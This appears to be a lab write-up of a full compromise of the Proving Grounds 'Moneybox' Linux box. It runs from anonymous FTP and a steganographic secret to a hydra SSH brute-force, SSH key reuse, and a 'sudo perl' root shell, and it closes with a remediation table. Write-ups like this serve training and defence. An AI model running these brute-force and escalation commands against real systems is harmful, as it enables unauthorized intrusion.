# Penetration Test Report — Moneybox

**Platform:** OffSec Proving Grounds
**Target:** Moneybox (Linux)
**Author:** V B
**Date:** 2026-10-11
**Result:** Fully compromised — local and root flags captured (2/2)

> Flag values are intentionally withheld in line with responsible disclosure practice.

---

## 1. Summary

Moneybox is a Linux host rated Easy. A full compromise was achieved through the following chain:

1. **Recon** revealed three services: FTP, SSH, and HTTP.
2. **Anonymous FTP** exposed an image file containing steganographically hidden data.
3. **Web enumeration** uncovered a hidden directory whose page comments leaked a steghide passphrase.
4. **Steganography** extraction produced a username and a weak-password hint.
5. **SSH password guessing** recovered the first user's credentials (`renu`).
6. **Lateral movement** to a second user (`lily`) via a reused SSH key found in `authorized_keys`.
7. **Privilege escalation** to root through a `sudo NOPASSWD` entry on the Perl interpreter.

---

## 2. Enumeration

### 2.1 Port Scan

```
nmap -p- --min-rate 5000 <target>
nmap -sC -sV -p 21,22,80 <target>
```

| Port | Service | Version |
|------|---------|---------|
| 21   | FTP     | vsftpd 3.0.3 |
| 22   | SSH     | OpenSSH 7.9p1 (Debian) |
| 80   | HTTP    | Apache 2.4.38 (Debian) |

The service scan also flagged that anonymous FTP login was permitted and listed one file, `trytofind.jpg`.

### 2.2 FTP — Anonymous Access

```
ftp <target>
Name: anonymous
Password: <blank>
ftp> ls -la
-rw-r--r-- 1 0 0 1093656 Feb 26 2021 trytofind.jpg
ftp> get trytofind.jpg
```

### 2.3 Web Enumeration

```
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Finding: `/blogs/` (301). The page at `/blogs/` contained an HTML comment pointing to a hidden directory:

```
<!-- the hint is the another secret directory is S3cr3t-T3xt -->
```

Requesting that directory returned a page whose source held a second comment disclosing a secret key:

```
<!.. Secret Key <redacted> >
```

---

## 3. Foothold

### 3.1 Steganography

Image triage (`exiftool`, `strings`, `binwalk`, `xxd | tail`) showed no appended data and a clean JPEG end marker, indicating embedded rather than appended content. The key recovered from the web page was used as the steghide passphrase:

```
steghide extract -sf trytofind.jpg -p <key>
wrote extracted data to "data.txt"
```

`data.txt` contained a message addressed to **renu**, warning that the password was weak.

### 3.2 SSH Credential Attack

```
hydra -l renu -P <wordlist> ssh://<target> -t 4
[22][ssh] login: renu password: <redacted>
```

SSH login as `renu` succeeded.

---

## 4. Local Flag

```
renu@MoneyBox:~$ id
uid=1001(renu) gid=1001(renu) groups=1001(renu)
renu@MoneyBox:~$ cat ~/local.txt
<redacted>
```

Local flag captured. `renu` had no sudo rights:

```
renu@MoneyBox:~$ sudo -l
Sorry, user renu may not run sudo on MoneyBox.
```

---

## 5. Lateral Movement — renu → lily

`renu`'s shell history referenced generating an SSH key and copying it to `lily`. A hash comparison confirmed `renu`'s public key was the entire contents of `lily`'s `authorized_keys`:

```
sha256sum ~/.ssh/id_rsa.pub /home/lily/.ssh/authorized_keys
886437...5732  /home/renu/.ssh/id_rsa.pub
886437...5732  /home/lily/.ssh/authorized_keys
```

Login as `lily` using the matching private key succeeded with no password prompt.

---

## 6. Privilege Escalation — lily → root

```
lily@MoneyBox:~$ sudo -l
User lily may run the following commands on MoneyBox:
    (ALL : ALL) NOPASSWD: /usr/bin/perl
```

Perl can spawn a shell, and the NOPASSWD entry allowed it to run as root:

```
lily@MoneyBox:~$ sudo perl -e 'exec "/bin/sh";'
# id
uid=0(root) ...
# cat /root/proof.txt
<redacted>
```

Root flag captured. Full compromise achieved.

---

## 7. Findings and Remediation

| # | Finding | Severity | Remediation |
|---|---------|----------|-------------|
| 1 | Anonymous FTP enabled | Medium | Disable anonymous login; remove vsftpd if unused |
| 2 | Secret leaked in HTML comments | Medium | Strip comments and hidden paths from public pages |
| 3 | Secret hidden in a publicly served image | Medium | Never store secrets in web-accessible files |
| 4 | Weak SSH password, no lockout | High | Enforce key-based auth; set `PasswordAuthentication no`; add fail2ban |
| 5 | SSH key reuse across accounts | High | Audit every `authorized_keys`; a user's key in another user's file is a finding |
| 6 | `sudo NOPASSWD` on Perl interpreter | Critical | Remove NOPASSWD on interpreters; interpreters cannot be exposed via sudo safely |

---

